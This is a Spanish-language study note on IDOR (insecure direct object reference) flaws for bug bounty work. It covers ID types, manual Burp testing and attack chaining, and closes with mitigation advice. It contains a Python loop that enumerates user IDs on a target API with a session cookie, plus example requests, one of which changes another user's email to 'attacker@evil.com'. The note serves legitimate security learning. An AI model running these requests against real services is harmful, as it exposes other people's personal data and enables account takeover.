---
title: "IDOR — Insecure Direct Object Reference"
type: note
status: active
tags:
  - seguridad
  - web
  - idor
  - vulnerabilidades
aliases:
  - IDOR
  - Insecure Direct Object Reference
  - Broken Access Control
created: 2026-06-13
updated: 2026-06-13
---

# IDOR — Insecure Direct Object Reference

> [!INFO] Fuente
> PortSwigger Access Control, HackerOne disclosed reports.

---

## Que es

Ocurre cuando un usuario puede acceder a recursos de otros usuarios modificando parametros (IDs, UUIDs, nombres de archivo, etc.) sin que el servidor verifique si tiene permiso.

Es la **vulnerabilidad mas comun en bug bounty** y la que mas pagos inmediatos genera por su simplicidad y alto impacto.

---

## Tipos de IDs

| Tipo | Ejemplo | Facilidad de explotar |
|------|---------|----------------------|
| Numerico secuencial | `/api/user/1`, `/api/user/2` | Trivial |
| UUID v4 | `a1b2c3d4-...` | No predecible (pero pueden estar expuestos) |
| Hash debil | `user_abc123` (base64, MD5) | A veces reversible |
| Email/username | `/api/user/juan@target.com` | Trivial si sabes el email |
| Timestamp | `/invoice/1718200000` | Predecible |

---

## Como buscar IDOR

### Manual (Burp)

```http
1. Autenticarse como Usuario A
2. Obtener request a recurso sensible
   GET /api/invoice/INV-001 HTTP/1.1
3. Cambiar el ID
   GET /api/invoice/INV-002 HTTP/1.1
4. Si devuelve datos de otro usuario → IDOR
```

### Automatizado

```python
import requests

base_url = "https://target.com/api/user/"
cookies = {"session": "abc123"}

for id in range(1, 1000):
    r = requests.get(f"{base_url}{id}", cookies=cookies)
    if r.status_code == 200 and "nombre" in r.text:
        print(f"[+] IDOR en user/{id}: {r.text[:100]}")
```

---

## IDOR en diferentes contextos

### REST APIs

```http
GET /api/v1/users/12345/profile
GET /api/v1/orders/ORDER-98765
GET /api/v1/documents/abc-123/download
POST /api/v1/messages/98765/delete
```

### Parametros POST

```http
POST /api/v1/email/change
Content-Type: application/json

{"user_id": 123, "email": "attacker@evil.com"}
→ Probar user_id: 124, 125...
```

### Nested IDOR

```http
GET /api/v1/companies/50/invoices/INV-001
GET /api/v1/companies/50/invoices/INV-002

# Tambien probar cambiar company_id
GET /api/v1/companies/51/invoices/INV-001  # Acceso cross-company
```

### IDOR en headers

```http
GET /api/v1/dashboard HTTP/1.1
X-User-Id: 123
→ Cambiar a X-User-Id: 124
```

---

## UUID no es invulnerable

```http
GET /api/v1/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890/profile

# Aunque el UUID no sea predecible:
# 1. Puede estar en URLs de otras funcionalidades (compartir perfil)
# 2. Puede estar en el HTML (hidden inputs, data attributes)
# 3. Puede filtrarse en logs, WebSockets, o GraphQL
# 4. Si hay mass assignment, podes descubrir UUIDs
```

---

## Encadenando IDOR

```
IDOR + CUENTA BANCARIA
  Encontrar IDOR en /api/invoice/{id}
  → Descargar facturas de otros usuarios
  → Contienen IBAN/CBU, nombre, direccion
  → PII leak masivo

IDOR + REVELACION DE DATOS
  Encontrar IDOR en /api/user/{id}/profile
  → Email, telefono, direccion
  → Usar esos datos para spear phishing
  → Account takeover

IDOR + CROSS-COMPANY (B2B)
  Encontrar IDOR en /api/company/{id}/settings
  → Modificar config de otra empresa
  → SSRF, webhooks, billing
```

---

## Por que paga bien

| Motivo | Explicacion |
|--------|-------------|
| Facil de encontrar | Solo requiere cambiar un numero |
| Impacto directo | PII leak, ATO potencial |
| Muy comun | La mayoria de apps no verifican permisos correctamente |
| Escalable | Automatizable con scripts |

---

## Mitigacion (para entender que buscar)

```
❌ App.get("/api/invoice/:id", getInvoice)  # Sin verificacion
✅ App.get("/api/invoice/:id", requireAuth, verifyOwnership, getInvoice)

La funcion verifyOwnership chequea:
  - El invoice pertenece al usuario autenticado?
  - El usuario tiene rol para ver invoices de otros?
```

---

## Labs

| Recurso | Link |
|---------|------|
| PortSwigger Access Control | portswigger.net/web-security/access-control |
| HackerOne IDOR reports | hackerone.com/hacktivity?filter=idor |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/Hacking Activo]]
- [[SEGURIDAD/00 - INDICE]]
